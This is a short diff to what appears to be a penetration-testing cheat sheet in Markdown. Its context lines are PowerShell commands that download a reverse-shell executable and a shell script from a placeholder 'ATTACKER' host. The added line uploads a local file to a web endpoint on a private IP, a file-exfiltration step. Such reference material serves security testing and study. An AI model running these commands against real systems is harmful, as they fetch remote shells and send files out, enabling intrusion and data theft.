@@ -2635,6 +2635,9 @@ invoke-webrequest -uri http://ATTACKER/rsh.exe -out c:\users\public\rsh.exe
 # For PowerShell version < 3.0
 (net.webclient).downloadstring("http://ATTACKER/shell.ps1") > c:\users\public\shell.ps1
 (net.webclient).downloadfile("http://ATTACKER/shell.ps1", "c:\users\public\shell.ps1")
+
+# uploading a file:
+(New-Object System.Net.WebClient).UploadFile('http://192.168.119.144/upload.php','somefiile')
 ```
 
 ### 7.2.4. Mount NFS Share
